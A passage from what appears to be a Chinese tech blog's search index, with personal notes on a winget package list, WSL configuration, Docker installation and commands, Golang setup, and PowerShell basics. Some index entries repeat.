Edge WebView2 Runtime Microsoft.EdgeWebView2Runtime 119.0.2151.44 winget Cortana Microsoft.549981C3F5F10_8wekyb3d8bbwe 4.2308.1005.0 AV1 Video Extension Microsoft.AV1VideoExtension_8wekyb3d8bbwe 1.1.61781.0 MSN 天气 Microsoft.BingWeather_8wekyb3d8bbwe 4.53.52331.0 应用安装程序 Microsoft.DesktopAppInstaller_8wekyb3d8bbwe 1.21.2771.0 Xbox Microsoft.GamingApp_8wekyb3d8bbwe 2309.1001.3.0 获取帮助 Microsoft.GetHelp_8wekyb3d8bbwe 10.2308.12552.0 Microsoft 使用技巧 Microsoft.Getstarted_8wekyb3d8bbwe 1.3.42522.0 HEIF Image Extensions Microsoft.HEIFImageExtension_8wekyb3d8bbwe 1.0.62561.0 来自设备制造商的 HEVC 视频扩展 Microsoft.HEVCVideoExtension_8wekyb3d8bbwe 2.0.61931.0 中文(简体)本地体验包 Microsoft.LanguageExperiencePackzh-CN_8wekyb3d8bbwe 22621.39.181.0 Microsoft Edge Dev Microsoft.MicrosoftEdge.Dev_8wekyb3d8bbwe 120.0.2186.2 Microsoft Edge Microsoft.MicrosoftEdge.Stable_8wekyb3d8bbwe 119.0.2151.44 Microsoft 365 (Office) Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe 18.2306.1061.0 Solitaire \u0026 Casual Games Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe 4.18.11019.0 Microsoft 便笺 Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe 4.0.4602.0 OneDrive Microsoft.OneDriveSync_8wekyb3d8bbwe 23209.1008.2.0 画图 Microsoft.Paint_8wekyb3d8bbwe 11.2309.28.0 Microsoft 人脉 Microsoft.People_8wekyb3d8bbwe 10.2202.33.0 Power Automate Microsoft.PowerAutomateDesktop_8wekyb3d8bbwe 1.0.884.0 Raw Image Extension Microsoft.RawImageExtension_8wekyb3d8bbwe 2.1.62561.0 截图工具 Microsoft.ScreenSketch_8wekyb3d8bbwe 11.2309.16.0 Windows 安全中心 Microsoft.SecHealthUI_8wekyb3d8bbwe 1000.25873.9001.0 Microsoft Store 体验主机 Microsoft.StorePurchaseApp_8wekyb3d8bbwe 22307.1401.9.0 Microsoft To Do Microsoft.Todos_8wekyb3d8bbwe 2.108.62932.0 VP9 Video Extensions Microsoft.VP9VideoExtensions_8wekyb3d8bbwe 1.0.61591.0 Web 媒体扩展 Microsoft.WebMediaExtensions_8wekyb3d8","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/:6:0","series":null,"tags":["blog","windows"],"title":"windows的初始化","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/#winget-记录"},{"categories":["point"],"content":"wsl 是 windows 下面的 linux 子系统. 方便开发人员在 windows 上使用 linux. 要点: 打通了文件系统 网络互通 支持 linux 图形界面 ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/wsl/:0:0","series":null,"tags":["point","wsl"],"title":"wsl","uri":"/posts/%E7%AC%94%E8%AE%B0/point/wsl/#"},{"categories":["point"],"content":" 相关内容","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/wsl/:1:0","series":null,"tags":["point","wsl"],"title":"wsl","uri":"/posts/%E7%AC%94%E8%AE%B0/point/wsl/#相关内容"},{"categories":["point"],"content":" 管理工具wsl2-distro-manager简称WSL-Manager 可以帮助操作 鼠标启停 磁盘位置选择 备份 清理无用 ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/wsl/:1:1","series":null,"tags":["point","wsl"],"title":"wsl","uri":"/posts/%E7%AC%94%E8%AE%B0/point/wsl/#管理工具"},{"categories":["point"],"content":" 互通访问本机=\u003ewsl: localhost 访问 #todo/笔记 ,多个机器呢? wsl =\u003e本机: cat /etc/resolv.conf中的nameserver,可以加入到 登录后的提示信息 #todo/笔记 ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/wsl/:1:2","series":null,"tags":["point","wsl"],"title":"wsl","uri":"/posts/%E7%AC%94%E8%AE%B0/point/wsl/#互通访问"},{"categories":["point"],"content":" 启用 systemd默认不是 Systemd 守护进程. 改动如下 WSL-Manager =\u003e某实例=\u003e设置=\u003eWSL 设置=\u003e启动=\u003e勾选 Systemd 操作如下: vim /etc/wsl.conf [boot] systemd=true # 重启生效 ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/wsl/:1:3","series":null,"tags":["point","wsl"],"title":"wsl","uri":"/posts/%E7%AC%94%E8%AE%B0/point/wsl/#启用-systemd"},{"categories":["point"],"content":" 禁用 windows 下的 PATH WSL-Manager =\u003e某实例=\u003e设置=\u003eWSL 设置=\u003e互操作性=\u003e开启再关闭 AppendWindowsPath 配置文件 vim /etc/wsl.conf [interop] appendWindowsPath = false # 重启生效 ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/wsl/:1:4","series":null,"tags":["point","wsl"],"title":"wsl","uri":"/posts/%E7%AC%94%E8%AE%B0/point/wsl/#禁用-windows-下的-path"},{"categories":["point"],"content":"docker 是一个用 golang 编写的容器化工具. 要点: 用户量大, 生态好 常用于软件打包 ","date":"2023-06-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/docker/:0:0","series":null,"tags":["point","docker"],"title":"docker","uri":"/posts/%E7%AC%94%E8%AE%B0/point/docker/#"},{"categories":["blog"],"content":"这里记录 [[笔记/point/docker|docker]] 的所有配置和操作.","date":"2023-06-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/","series":null,"tags":["blog","docker"],"title":"docker教程","uri":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/"},{"categories":["blog"],"content":" 简介这里记录 docker 的所有配置和操作. 相关的概念可以通过 容器 来了解. ","date":"2023-06-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/:1:0","series":null,"tags":["blog","docker"],"title":"docker教程","uri":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/#简介"},{"categories":["blog"],"content":" 安装/卸载 docker官方文档Install Docker Engine on Ubuntu 速度慢? 可以试试 清华源, 阿里源 和 华为源 # 前置准备 curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg chmod a+r /etc/apt/keyrings/docker.gpg echo \\ \"deb [arch=\"$(dpkg --print-architecture)\" signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \\ \"$(. /etc/os-release \u0026\u0026 echo \"$VERSION_CODENAME\")\" stable\" | \\ sudo tee /etc/apt/sources.list.d/docker.list \u003e /dev/null # 开始安装 apt update -y apt install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin -y vim /etc/docker/daemon.json systemctl daemon-reload systemctl enable docker --now # 卸载 apt remove docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin -y 华为国内源： #todo/笔记 下面有问题 curl -fsSL https://mirrors.huaweicloud.com/docker-ce/linux/debian/gpg | sudo apt-key add - sudo add-apt-repository \"deb [arch=amd64] https://mirrors.huaweicloud.com/docker-ce/linux/debian $(lsb_release -cs) stable\" echo \"deb [arch=armhf] https://mirrors.huaweicloud.com/docker-ce/linux/debian $(lsb_release -cs) stable\" | sudo tee /etc/apt/sources.list.d/docker.list apt update -y apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin 清华源，速度一般般： # 删掉以前的版本 for pkg in docker.io docker-doc docker-compose podman-docker containerd runc; do apt-get remove $pkg; done # 安装一些必备的内容 apt-get update apt-get install ca-certificates curl gnupg # 信任 Docker 的 GPG 公钥并添加仓库： install -m 0755 -d /etc/apt/keyrings curl -fsSL https://download.docker.com/linux/ubuntu/gpg | gpg --dearmor -o /etc/apt/keyrings/docker.gpg sudo chmod a+r /etc/apt/keyrings/docker.gpg echo \\ \"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/ubuntu \\ \"$(. /etc/os-release \u0026\u0026 echo \"$VERSION_CODENAME\")\" stable\" | \\ tee /etc/apt/sources.list.d/docker.list \u003e /dev/null # 安装 apt-get update apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin ","date":"2023-06-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/:2:0","series":null,"tags":["blog","docker"],"title":"docker教程","uri":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/#安装卸载-docker"},{"categories":["blog"],"content":" dockerd 配置参数 /etc/docker/daemon.json 的 registry-mirrors 是拉取镜像的地址, 代替 docker.io. 而 proxies 是设置容器网络代理, 这样容器里的 curl 就能使用到代理了. 参考 镜像源 和 http代理 { \"registry-mirrors\": [\"https://hub-mirror.c.163.com\"], \"proxies\": { \"http-proxy\": \"http://proxy.example.com:3128\", \"https-proxy\": \"https://proxy.example.com:3129\", \"no-proxy\": \" localhost,10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,*.test.example.com\" } } Systemd 配置 http/https 代理, 这样 dockerd 就能使用代理了 [Service] Environment=\"HTTP_PROXY=http://proxy.example.com:3128\" Environment=\"HTTPS_PROXY=https://proxy.example.com:3129\" Environment=\"NO_PROXY=localhost,127.0.0.1,docker-registry.example.com,.corp\" ","date":"2023-06-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/:3:0","series":null,"tags":["blog","docker"],"title":"docker教程","uri":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/#dockerd-配置参数"},{"categories":["blog"],"content":" 命令解析","date":"2023-06-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/:4:0","series":null,"tags":["blog","docker"],"title":"docker教程","uri":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/#命令解析"},{"categories":["blog"],"content":" 示例解析 # -d 后台运行,--restart=always 总是重启, # -v /mydata/:/data/ 本地/mydata/挂载到容器/data/ # 暴露本地12端口,映射到容器34端口. # 仅本地示例 -p 127.0.0.1:8000:8080 # 默认启动,如果加上/bin/bash,就是进入bash命令 docker run -d --name testserver \\ -v /mydata/:/data/ \\ -e A=a \\ -p 12:34 \\ --restart=always \\ kentxqq/testserver:1.2 \\ /bin/bash # -t指定名字myapp .代表Dockerfile在当前目录 docker build -t myapp . ","date":"2023-06-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/:4:1","series":null,"tags":["blog","docker"],"title":"docker教程","uri":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/#示例解析"},{"categories":["blog"],"content":" nodejs 示例 # 挂载前端node项目到 /app 目录，然后 npm start 启动 docker run -d -p3000:3000 \\ -v /data/frontend/shop-pc:/app \\ -w /app \\ node:14 /bin/bash -c \"npm start\" ","date":"2023-06-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/:4:2","series":null,"tags":["blog","docker"],"title":"docker教程","uri":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/#nodejs-示例"},{"categories":["blog"],"content":" 操作命令","date":"2023-06-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/:5:0","series":null,"tags":["blog","docker"],"title":"docker教程","uri":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/#操作命令"},{"categories":["blog"],"content":" 构建镜像 # 当前文件夹下的Dockerfile文件 # -t 指定名称，默认前缀是docker.io # --progress=plain 详细日志 --no-cache 禁用缓存 docker build --progress=plain --no-cache -t kentxxq/test-server:latest . ","date":"2023-06-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/:5:1","series":null,"tags":["blog","docker"],"title":"docker教程","uri":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/#构建镜像"},{"categories":["blog"],"content":" 查看容器映射的端口 docker port 容器名 ","date":"2023-06-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/:5:2","series":null,"tags":["blog","docker"],"title":"docker教程","uri":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/#查看容器映射的端口"},{"categories":["blog"],"content":" 进入和退出容器 docker exec --rm -it 容器id /bin/bash # 如果不想关闭容器 ctrl+p ctrl+q ","date":"2023-06-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/:5:3","series":null,"tags":["blog","docker"],"title":"docker教程","uri":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/#进入和退出容器"},{"categories":["blog"],"content":" 导入导出 镜像 # 保存1个或多个镜像到tar文件 docker save busybox nginx \u003e 2img.tar # 导入 docker load -i dockerdemo.tar 容器 # 导出容器 docker export 容器id xxx.tar # 导入成镜像 docker import xxx.tar 镜像:tag ","date":"2023-06-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/:5:4","series":null,"tags":["blog","docker"],"title":"docker教程","uri":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/#导入导出"},{"categories":["blog"],"content":" 导入导出 镜像 # 保存1个或多个镜像到tar文件 docker save busybox nginx \u003e 2img.tar # 导入 docker load -i dockerdemo.tar 容器 # 导出容器 docker export 容器id xxx.tar # 导入成镜像 docker import xxx.tar 镜像:tag ","date":"2023-06-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/:5:4","series":null,"tags":["blog","docker"],"title":"docker教程","uri":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/#镜像"},{"categories":["blog"],"content":" 导入导出 镜像 # 保存1个或多个镜像到tar文件 docker save busybox nginx \u003e 2img.tar # 导入 docker load -i dockerdemo.tar 容器 # 导出容器 docker export 容器id xxx.tar # 导入成镜像 docker import xxx.tar 镜像:tag ","date":"2023-06-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/:5:4","series":null,"tags":["blog","docker"],"title":"docker教程","uri":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/#容器"},{"categories":["blog"],"content":" 定时镜像清理 # vim /etc/crontab 0 2 * * * root /usr/bin/docker rmi $(docker images -q) -f 10 2 * * * root /usr/bin/docker image prune -a -f ","date":"2023-06-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/:5:5","series":null,"tags":["blog","docker"],"title":"docker教程","uri":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/#定时镜像清理"},{"categories":["blog"],"content":" IO 问题 - 定位容器 # 查看活动中的进程io iotop -oP # 排查 docker inspect -f \"{{.Id}} {{.State.Pid}} {{.Name}} \" $(docker ps -q) | grep pid ","date":"2023-06-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/:5:6","series":null,"tags":["blog","docker"],"title":"docker教程","uri":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/#io-问题---定位容器"},{"categories":["blog"],"content":" 清空 docker 日志 # 找到路径 docker inspect --format='{{.LogPath}}' 7ce2a0df954b truncate -s 0 /var/lib/docker/containers/完整id/完整id-json.log ","date":"2023-06-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/:5:7","series":null,"tags":["blog","docker"],"title":"docker教程","uri":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/#清空-docker-日志"},{"categories":["blog"],"content":" 上传 docker 镜像起因是国内经常因为网络问题, 无法正常拉取镜像. 需要手动把常用的镜像备份过来 (即使配置了代理源, 因为会请求 dockerhub 的接口, 这里也会导致失败). 这里记录一下 docker 的镜像上传. 在网络通常的情况下先拉取镜像 docker pull maven:3.6.1-jdk-8 给镜像打 tag docker tag maven:3.6.1-jdk-8 你的镜像仓库地址/命名空间/maven:3.6.1-jdk-8 # 这里拿阿里云的镜像仓库举例 # 镜像仓库命名为msb-images,下面是镜像仓库地址 # msb-images-registry-vpc.cn-zhangjiakou.cr.aliyuncs.com 私网 # msb-images-registry.cn-zhangjiakou.cr.aliyuncs.com 公网 # public 为命名空间 docker tag maven:3.6.1-jdk-8 msb-images-registry-vpc.cn-zhangjiakou.cr.aliyuncs.com/public/maven:3.6.1-jdk-8 登录,推送镜像 # 登录 docker login --username=用户名 -p 密码 msb-images-registry.cn-zhangjiakou.cr.aliyuncs.com # 推送 docker push msb-images-registry-vpc.cn-zhangjiakou.cr.aliyuncs.com/public/maven:3.6.1-jdk-8 ","date":"2023-06-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/:5:8","series":null,"tags":["blog","docker"],"title":"docker教程","uri":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/#上传-docker-镜像"},{"categories":["blog"],"content":" 文件拷贝 从镜像拷贝文件到本地 id = $(docker create 镜像名) docker cp $id:path - \u003e 本地文件名 docker rm -v $id powershell 版本: $id = docker create 镜像名 docker cp \"${id}:镜像内源文件路径\" - | Set-Content 目标文件名 docker rm -v $id ","date":"2023-06-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/:5:9","series":null,"tags":["blog","docker"],"title":"docker教程","uri":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/#文件拷贝"},{"categories":["blog"],"content":" 文件拷贝 从镜像拷贝文件到本地 id = $(docker create 镜像名) docker cp $id:path - \u003e 本地文件名 docker rm -v $id powershell 版本: $id = docker create 镜像名 docker cp \"${id}:镜像内源文件路径\" - | Set-Content 目标文件名 docker rm -v $id ","date":"2023-06-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/:5:9","series":null,"tags":["blog","docker"],"title":"docker教程","uri":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/#从镜像拷贝文件到本地"},{"categories":["blog"],"content":" docker 内安装 chrome FROM python:latest # install google chrome RUN wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add - RUN sh -c 'echo \"deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main\" \u003e\u003e /etc/apt/sources.list.d/google-chrome.list' RUN apt-get -y update RUN apt-get install -y google-chrome-stable # install chromedriver RUN apt-get install -yqq unzip RUN wget -O /tmp/chromedriver.zip http://chromedriver.storage.googleapis.com/`curl -sS chromedriver.storage.googleapis.com/LATEST_RELEASE`/chromedriver_linux64.zip RUN unzip /tmp/chromedriver.zip chromedriver -d /usr/local/bin/ # set display port to avoid crash ENV DISPLAY=:99 ","date":"2023-06-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/:5:10","series":null,"tags":["blog","docker"],"title":"docker教程","uri":"/posts/%E7%AC%94%E8%AE%B0/docker%E6%95%99%E7%A8%8B/#docker-内安装-chrome"},{"categories":["point"],"content":"golang 是一个编程语言. 要点如下: 跨平台编译/部署 性能好,内存占用小 静态语言 ","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/golang/:0:0","series":null,"tags":["point","golang"],"title":"golang","uri":"/posts/%E7%AC%94%E8%AE%B0/point/golang/#"},{"categories":["blog"],"content":"[[笔记/point/golang|golang]] 用的很少, 记录一下相关的安装, 配置, 构建.","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/golang%E7%9A%84%E4%BD%BF%E7%94%A8/","series":null,"tags":["blog","golang"],"title":"golang的使用","uri":"/posts/%E7%AC%94%E8%AE%B0/golang%E7%9A%84%E4%BD%BF%E7%94%A8/"},{"categories":["blog"],"content":" 简介golang 用的很少, 记录一下相关的安装, 配置, 构建. ","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/golang%E7%9A%84%E4%BD%BF%E7%94%A8/:1:0","series":null,"tags":["blog","golang"],"title":"golang的使用","uri":"/posts/%E7%AC%94%E8%AE%B0/golang%E7%9A%84%E4%BD%BF%E7%94%A8/#简介"},{"categories":["blog"],"content":" 操作手册","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/golang%E7%9A%84%E4%BD%BF%E7%94%A8/:2:0","series":null,"tags":["blog","golang"],"title":"golang的使用","uri":"/posts/%E7%AC%94%E8%AE%B0/golang%E7%9A%84%E4%BD%BF%E7%94%A8/#操作手册"},{"categories":["blog"],"content":" 安装 golang去 这里下载 最新的 tar 包, 拿 go1.20.6.linux-amd64.tar.gz 举例 # 解压到/usr/local/ tar -C /usr/local/ -xzf go1.20.6.linux-amd64.tar.gz # 文件内容 root@poc:/usr/local/go# ls -l /usr/local/go total 68 drwxr-xr-x 2 root root 4096 Jun 2 01:02 api drwxr-xr-x 2 root root 4096 Jun 2 01:04 bin -rw-r--r-- 1 root root 52 Jun 2 01:01 codereview.cfg -rw-r--r-- 1 root root 1339 Jun 2 01:01 CONTRIBUTING.md drwxr-xr-x 2 root root 4096 Jun 2 01:02 doc drwxr-xr-x 3 root root 4096 Jun 2 01:02 lib -rw-r--r-- 1 root root 1479 Jun 2 01:01 LICENSE drwxr-xr-x 11 root root 4096 Jun 2 01:02 misc -rw-r--r-- 1 root root 1303 Jun 2 01:01 PATENTS drwxr-xr-x 4 root root 4096 Jun 2 01:04 pkg -rw-r--r-- 1 root root 1455 Jun 2 01:01 README.md -rw-r--r-- 1 root root 419 Jun 2 01:01 SECURITY.md drwxr-xr-x 49 root root 4096 Jun 2 01:02 src drwxr-xr-x 26 root root 12288 Jun 2 01:02 test -rw-r--r-- 1 root root 8 Jun 2 01:01 VERSION # 加入 ~/.bashrc,每次生效 export PATH=$PATH:/usr/local/go/bin:/root/go/bin/ # 此次终端生效 source ~/.bashrc # 强烈建议配置代理 go env -w GOPROXY=https://goproxy.cn,direct # 这个也行 https://proxy.golang.com.cn,direct # 验证效果 go version go version go1.20.6 windows/amd64 ","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/golang%E7%9A%84%E4%BD%BF%E7%94%A8/:2:1","series":null,"tags":["blog","golang"],"title":"golang的使用","uri":"/posts/%E7%AC%94%E8%AE%B0/golang%E7%9A%84%E4%BD%BF%E7%94%A8/#安装-golang"},{"categories":["blog"],"content":" 配置环境变量 # 查看变量 go env # 配置GOPROXY变量,让go使用代理源加速 go env -w GOPROXY=https://goproxy.cn,direct # 常用构建配置 # 完整版参考 https://go.dev/doc/install/source#environment $GOOS $GOARCH windows amd64 linux amd64 linux arm64 darwin amd64 darwin amd64 ","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/golang%E7%9A%84%E4%BD%BF%E7%94%A8/:2:2","series":null,"tags":["blog","golang"],"title":"golang的使用","uri":"/posts/%E7%AC%94%E8%AE%B0/golang%E7%9A%84%E4%BD%BF%E7%94%A8/#配置环境变量"},{"categories":["point"],"content":"hugo 是一个静态网站生成工具, 使用 golang 编写. GitHub - gohugoio/hugo: The world’s fastest framework for building websites. 运行启动 hugo serve --disableFastRender 要点: 速度快 迭代迅速且功能多 ","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/hugo/:0:0","series":null,"tags":["point","hugo"],"title":"hugo","uri":"/posts/%E7%AC%94%E8%AE%B0/point/hugo/#"},{"categories":["point"],"content":"MinGW-w64 是一个基于 gcc 的 windows 开发工具集. 让你可以在 windows 上轻松使用 make, gcc 等命令. ","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/mingw-w64/:0:0","series":null,"tags":["point","MinGW-w64"],"title":"MinGW-w64","uri":"/posts/%E7%AC%94%E8%AE%B0/point/mingw-w64/#"},{"categories":["point"],"content":"powershell 是一种 shell. 让你使用命令行操作系统. 要点: 跨平台 Windows 上的御用命令行 ","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/powershell/:0:0","series":null,"tags":["point","powershell"],"title":"powershell","uri":"/posts/%E7%AC%94%E8%AE%B0/point/powershell/#"},{"categories":["blog"],"content":"这里记录 [[笔记/point/powershell|powershell]] 的常用命令.","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/powershell%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/","series":null,"tags":["blog","powershell"],"title":"powershell命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/powershell%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":" 简介这里记录 powershell 的常用命令. ","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/powershell%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:1:0","series":null,"tags":["blog","powershell"],"title":"powershell命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/powershell%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#简介"},{"categories":["blog"],"content":" 操作手册","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/powershell%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:2:0","series":null,"tags":["blog","powershell"],"title":"powershell命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/powershell%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#操作手册"},{"categories":["blog"],"content":" 日常操作 grep 过滤 # 类似 ls | grep xxx 搜索 winget list | Select-String nodejs 重载配置文件 . $profile 操作变量 # 示例是配置golang,启用cgo编译 # 本地变量 脚本里建议用, Set-Variable set CGO_ENABLED \"1\" echo $CGO_ENABLED rv CGO_ENABLED # $env 用于访问用户变量和系统变量 echo $env:CGO_ENABLED ","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/powershell%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:2:1","series":null,"tags":["blog","powershell"],"title":"powershell命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/powershell%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#日常操作"},{"categories":["blog"],"content":" 日常操作 grep 过滤 # 类似 ls | grep xxx 搜索 winget list | Select-String nodejs 重载配置文件 . $profile 操作变量 # 示例是配置golang,启用cgo编译 # 本地变量 脚本里建议用, Set-Variable set CGO_ENABLED \"1\" echo $CGO_ENABLED rv CGO_ENABLED # $env 用于访问用户变量和系统变量 echo $env:CGO_ENABLED ","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/powershell%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:2:1","series":null,"tags":["blog","powershell"],"title":"powershell命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/powershell%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#grep-过滤"},{"categories":["blog"],"content":" 日常操作 grep 过滤 # 类似 ls | grep xxx 搜索 winget list | Select-String nodejs 重载配置文件 . $profile 操作变量 # 示例是配置golang,启用cgo编译 # 本地变量 脚本里建议用, Set-Variable set CGO_ENABLED \"1\" echo $CGO_ENABLED rv CGO_ENABLED # $env 用于访问用户变量和系统变量 echo $env:CGO_ENABLED ","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/powershell%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:2:1","series":null,"tags":["blog","powershell"],"title":"powershell命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/powershell%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#重载配置文件"},{"categories":["blog"],"content":" 日常操作 grep 过滤 # 类似 ls | grep xxx 搜索 winget list | Select-String nodejs 重载配置文件 . $profile 操作变量 # 示例是配置golang,启用cgo编译 # 本地变量 脚本里建议用, Set-Variable set CGO_ENABLED \"1\" echo $CGO_ENABLED rv CGO_ENABLED # $env 用于访问用户变量和系统变量 echo $env:CGO_ENABLED ","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/powershell%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:2:1","series":null,"tags":["blog","powershell"],"title":"powershell命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/powershell%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#操作变量"},{"categories":["blog"],"content":" 命令查询 # 查询所有命令 Get-Command # 查询名字包含Process的命令 Get-Command -Name *Process # 查看alias Get-Alias Alias set -\u003e Set-Variable Alias echo -\u003e Write-Output Alias rv -\u003e Remove-Variable Alias ls -\u003e Get-ChildItem Alias cat -\u003e Get-Content Alias cd -\u003e Set-Location Alias clear -\u003e Clear-Host Alias copy -\u003e Copy-Item Alias cp -\u003e Copy-Item Alias mv -\u003e Move-Item 